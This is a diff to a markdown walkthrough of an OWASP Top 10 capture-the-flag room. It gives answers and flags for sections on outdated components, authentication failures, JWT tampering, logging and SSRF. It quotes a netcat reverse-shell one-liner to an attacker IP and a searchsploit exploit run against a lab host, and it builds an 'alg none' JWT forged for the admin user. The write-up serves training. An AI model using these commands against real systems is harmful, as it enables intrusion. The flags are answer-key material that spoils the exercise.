@@ -46,11 +46,46 @@ Here we can execute system commands on the Werkzeug console, for example: <br />
 Let's spawn a reverse shell. Start a netcat listener on your machine: `nc -lnvp 4444` and, from the image above, instead of "ls -l", type `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.85.53 4444 >/tmp/f` and spawn a shell: <br />
 ![image](https://github.com/user-attachments/assets/d556ab1c-f012-4329-a9d6-f938a26fd930)<br />
 - What is the database file name (the one with the .db extension) in the current directory? `todo.db`
-- Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
+- Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code? `THM{Just_a_tiny_misconfiguration}`
 
+- ### Vulnerable and Outdated Components - Lab
+- What is the content of the /opt/flag.txt file? <br />
+We can use `searchsploit` to find what we are looking for: <br />
+![image](https://github.com/user-attachments/assets/566b34d2-6bee-418d-b158-36fb1f019657)<br />
+Now run the command: `python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://10.10.119.6:84`
+![image](https://github.com/user-attachments/assets/39ddd822-37c7-4c5f-8eb9-109246e1070f) <br />
+the answer is `THM{But_1ts_n0t_my_f4ult!}`.
 
+### 7. Identification and Authentication Failures
+- What is the flag that you found in darren's account? `fe86079416a21a3c99937fea8874b667`
+- What is the flag that you found in arthur's account? `d9ac0f7db4fda460ac3edeb75d75e16e`
 
+### 8. Software Integrity Failures
+- What is the SHA-256 hash of https://code.jquery.com/jquery-1.12.4.min.js? `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`
 
+### Data Integrity Failures
+- Try logging into the application as guest. What is guest's account password? `guest`
+- What is the name of the website's cookie containing a JWT token? <br />
+![image](https://github.com/user-attachments/assets/4d11ee50-5d67-4868-81eb-1ddfe60b91c1)<br />
+`jwt-session`
+- What is the flag presented to the admin user? <br />
+A JWT token is made of three parts: the **header** contains informations such as the algorithm used for the signature, the **body** contains the actual information, and then there's the **signature**. These sections are all **base64 encoded and separated by dots**. Therefore, take the first two parts of the JWT token and decode them and here's the content:
+
+      header: {"typ":"JWT","alg":"HS256"}
+      body: {"username":"guest","exp":1724776829}
+So, one thing we can try to do is to manually change the "alg" value to "none", and the "username" value as "admin", to try to log as admins. The new JWT looks like this: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI0Nzc2ODI5fQ==.` <br />
+![image](https://github.com/user-attachments/assets/ecea5c47-897b-4c1c-b376-7f13b2459be7)<br />
+`THM{Dont_take_cookies_from_strangers}`
+
+### 9. Security Logging and Monitoring Failures
+![image](https://github.com/user-attachments/assets/cf43ffa9-3258-4b9b-aa1f-67399fa52f62)<br />
+- What IP address is the attacker using? `49.99.13.16`
+- What kind of attack is being carried out? `Brute Force`
+ 
+### 10. Server-Side Request Forgery (SSRF)
+- Explore the website. What is the only host allowed to access the admin area? `localhost`
+- Check the "Download Resume" button. Where does the server parameter point to? `secure-file-storage.com`
+- Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request? `THM{Hello_Im_just_an_API_key}`
 
 
 
